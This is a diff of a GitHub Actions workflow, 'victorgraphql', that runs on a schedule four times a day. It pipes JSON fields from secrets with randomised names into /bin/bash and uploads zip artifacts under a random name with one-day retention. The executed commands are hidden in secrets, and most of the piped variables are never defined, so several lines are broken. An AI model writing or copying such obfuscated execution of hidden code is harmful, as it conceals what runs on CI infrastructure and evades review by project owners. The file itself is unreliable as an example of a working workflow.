@@ -1,21 +1,27 @@
 name: victorgraphql
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '53 3/6 * * *'
+    - cron: '50 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: victorgraphql
         env:
-          ut56297: ${{ secrets.ut56297 }}
+          teakw2: ${{ secrets.teakw2 }}
         run: |
-          echo $ut56297 | jq -r .om37252 | /bin/bash
-          echo $cdam9647 | jq -r .ayzx00080 | /bin/bash
-          echo $n86 | jq -r .lzb39 | /bin/bash
-          echo $jg63222 | jq -r .chkr87 | /bin/bash
-          echo $tg75 | jq -r .ohce8539 | /bin/bash
+          printf '%s' "$teakw2" | jq -r .s43329 | /bin/bash
+          printf '%s' "$v7" | jq -r .psm58 | /bin/bash
+          echo $n7 | jq -r .n3773 | /bin/bash
+          echo $puzto7515 | jq -r .shnm733 | /bin/bash
+          printf '%s' "$yygrc25654" | jq -r .ftpv4 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: n2LHevPa
+          path: "*.zip"
+          retention-days: 1
